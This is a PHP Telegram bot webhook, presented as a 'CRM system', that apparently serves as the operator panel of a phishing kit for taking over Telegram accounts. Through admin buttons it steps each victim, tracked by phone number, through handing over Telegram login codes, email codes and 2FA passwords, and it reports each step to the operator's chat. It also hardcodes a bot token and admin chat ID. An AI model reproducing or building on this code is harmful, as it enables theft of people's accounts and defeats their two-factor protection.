<?php
// bot.php - обработчик вебхука для Telegram бота
$BOT_TOKEN = '7992834659:AAFLuj0-5S5HvNy0OoEf1_a8wAOWz5acBgY';
$ADMIN_CHAT_ID = '6897915758';
$SESSIONS_FILE = 'sessions.json';

// Получаем данные от Telegram
$update = json_decode(file_get_contents('php://input'), true);

if (!$update) {
    exit;
}

// Загружаем сессии
$sessions = file_exists($SESSIONS_FILE) ? 
    json_decode(file_get_contents($SESSIONS_FILE), true) : [];

// Функция отправки сообщения
function sendMessage($chat_id, $text, $keyboard = null) {
    global $BOT_TOKEN;
    
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    
    if ($keyboard) {
        $data['reply_markup'] = json_encode($keyboard);
    }
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

// Функция ответа на callback
function answerCallback($callback_id, $text = '') {
    global $BOT_TOKEN;
    
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery";
    $data = ['callback_query_id' => $callback_id];
    
    if ($text) {
        $data['text'] = $text;
    }
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

// Функция редактирования сообщения
function editMessage($chat_id, $message_id, $text, $keyboard = null) {
    global $BOT_TOKEN;
    
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/editMessageText";
    
    $data = [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    
    if ($keyboard) {
        $data['reply_markup'] = json_encode($keyboard);
    }
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

// Обработка callback-запросов (кнопки)
if (isset($update['callback_query'])) {
    $callback = $update['callback_query'];
    $chat_id = $callback['message']['chat']['id'];
    $data = $callback['data'];
    $message_id = $callback['message']['message_id'];
    
    // Проверяем админа
    if ($chat_id != $ADMIN_CHAT_ID) {
        answerCallback($callback['id'], "⛔ Нет доступа");
        exit;
    }
    
    // Разбираем callback данные
    if (strpos($data, ':') !== false) {
        list($action, $session_id) = explode(':', $data);
        
        if (isset($sessions[$session_id])) {
            $reply_text = "";
            
            switch ($action) {
                case 'tg_code':
                    $sessions[$session_id]['current_step'] = 'tg_code';
                    $reply_text = "📱 <b>ЗАПРОС НА КОД ИЗ TELEGRAM</b>\n\n";
                    $reply_text .= "📞 Телефон: {$sessions[$session_id]['phone']}\n";
                    $reply_text .= "🆔 ID: <code>{$session_id}</code>\n\n";
                    $reply_text .= "<i>Пользователь вводит 5-значный код из Telegram...</i>";
                    break;
                    
                case 'email_code':
                    $sessions[$session_id]['current_step'] = 'email_code';
                    $reply_text = "📧 <b>ЗАПРОС НА EMAIL КОД</b>\n\n";
                    $reply_text .= "📞 Телефон: {$sessions[$session_id]['phone']}\n";
                    $reply_text .= "🆔 ID: <code>{$session_id}</code>\n\n";
                    $reply_text .= "<i>Пользователь вводит 6-значный код с email...</i>";
                    break;
                    
                case 'deny':
                    $sessions[$session_id]['current_step'] = 'denied';
                    $sessions[$session_id]['code_status'] = 'denied';
                    $reply_text = "❌ <b>ЗАПРОС ОТКЛОНЕН</b>\n\n";
                    $reply_text .= "📞 Телефон: {$sessions[$session_id]['phone']}\n";
                    $reply_text .= "🆔 ID: <code>{$session_id}</code>";
                    break;
                    
                case 'correct':
                    $sessions[$session_id]['code_status'] = 'correct';
                    $reply_text = "✅ <b>КОД ПОДТВЕРЖДЕН</b>\n\n";
                    $reply_text .= "📞 Телефон: {$sessions[$session_id]['phone']}\n";
                    $reply_text .= "🆔 ID: <code>{$session_id}</code>\n\n";
                    
                    // Определяем следующий шаг
                    $code_type = $sessions[$session_id]['code_type'] ?? '';
                    if ($code_type === 'tg_code' || $code_type === 'email_code') {
                        $reply_text .= "<i>Следующий шаг: ввод пароля 2FA</i>";
                    } else {
                        $reply_text .= "<i>Авторизация успешна!</i>";
                    }
                    break;
                    
                case 'incorrect':
                    $sessions[$session_id]['code_status'] = 'incorrect';
                    $reply_text = "❌ <b>КОД НЕВЕРНЫЙ</b>\n\n";
                    $reply_text .= "📞 Телефон: {$sessions[$session_id]['phone']}\n";
                    $reply_text .= "🆔 ID: <code>{$session_id}</code>\n\n";
                    $reply_text .= "<i>Пользователь вводит код заново...</i>";
                    break;
                    
                case 'next_step':
                    // Переход на следующий шаг (завершение или пароль 2FA)
                    $code_type = $sessions[$session_id]['code_type'] ?? '';
                    if ($code_type === 'tg_code' || $code_type === 'email_code') {
                        $sessions[$session_id]['current_step'] = 'password_2fa';
                        $reply_text = "🔐 <b>СЛЕДУЮЩИЙ ШАГ: ПАРОЛЬ 2FA</b>\n\n";
                        $reply_text .= "📞 Телефон: {$sessions[$session_id]['phone']}\n";
                        $reply_text .= "🆔 ID: <code>{$session_id}</code>\n\n";
                        $reply_text .= "<i>Пользователь вводит пароль двухфакторной аутентификации...</i>";
                    } else {
                        $sessions[$session_id]['current_step'] = 'completed';
                        $reply_text = "🎉 <b>ПОДКЛЮЧЕНИЕ УСПЕШНО</b>\n\n";
                        $reply_text .= "📞 Телефон: {$sessions[$session_id]['phone']}\n";
                        $reply_text .= "🆔 ID: <code>{$session_id}</code>\n\n";
                        $reply_text .= "<i>Пользователь подключен к CRM системе!</i>";
                    }
                    break;
                    
                default:
                    $reply_text = "❓ Неизвестное действие";
            }
            
            // Сохраняем изменения
            file_put_contents($SESSIONS_FILE, json_encode($sessions, JSON_PRETTY_PRINT));
            
            // Отвечаем на callback
            answerCallback($callback['id'], "✓ Выполнено");
            
            // Обновляем сообщение
            editMessage($chat_id, $message_id, $reply_text);
            
            // Отправляем дополнительное уведомление
            if (in_array($action, ['tg_code', 'email_code', 'next_step'])) {
                $notification = "🔄 <b>Пользователь переведен на следующий шаг</b>\n";
                $notification .= "ID: <code>{$session_id}</code>\n";
                $notification .= "Шаг: " . $sessions[$session_id]['current_step'];
                sendMessage($chat_id, $notification);
            }
            
        } else {
            answerCallback($callback['id'], "❌ Сессия не найдена");
        }
    }
}

// Обработка текстовых команд
if (isset($update['message']) && isset($update['message']['text'])) {
    $message = $update['message'];
    $chat_id = $message['chat']['id'];
    $text = trim($message['text']);
    
    if ($chat_id != $ADMIN_CHAT_ID) {
        sendMessage($chat_id, "⛔ У вас нет доступа к этому боту.");
        exit;
    }
    
    if ($text == '/start' || $text == '/help') {
        $pending = 0;
        foreach ($sessions as $session) {
            if ($session['current_step'] == 'pending') $pending++;
        }
        
        $reply = "🤖 <b>CRM SYSTEM BOT</b>\n\n";
        $reply .= "📊 <b>Статистика:</b>\n";
        $reply .= "• Ожидают: {$pending} сессий\n";
        $reply .= "• Всего: " . count($sessions) . " сессий\n\n";
        $reply .= "Вы будете получать уведомления о новых подключениях.\n";
        $reply .= "Используйте кнопки для управления процессом.";
        
        sendMessage($chat_id, $reply);
    }
    
    if ($text == '/sessions') {
        $active_sessions = array_filter($sessions, function($session) {
            return in_array($session['current_step'], ['pending', 'tg_code', 'email_code', 'password_2fa']);
        });
        
        if (empty($active_sessions)) {
            sendMessage($chat_id, "📭 Нет активных сессий");
        } else {
            $reply = "📋 <b>АКТИВНЫЕ СЕССИИ ПОДКЛЮЧЕНИЯ</b> (" . count($active_sessions) . ")\n\n";
            foreach ($active_sessions as $id => $session) {
                $status_icons = [
                    'pending' => '⏳',
                    'tg_code' => '📱',
                    'email_code' => '📧',
                    'password_2fa' => '🔐',
                    'completed' => '✅'
                ];
                $status_icon = $status_icons[$session['current_step']] ?? '❓';
                
                $reply .= "{$status_icon} <b>ID:</b> <code>{$id}</code>\n";
                $reply .= "📞 <b>Телефон:</b> {$session['phone']}\n";
                $reply .= "📊 <b>Статус:</b> {$session['current_step']}\n";
                if (isset($session['created_at'])) {
                    $reply .= "🕐 <b>Создана:</b> " . date('H:i:s', $session['created_at']) . "\n";
                }
                $reply .= "────────────\n";
            }
            sendMessage($chat_id, $reply);
        }
    }
}
?>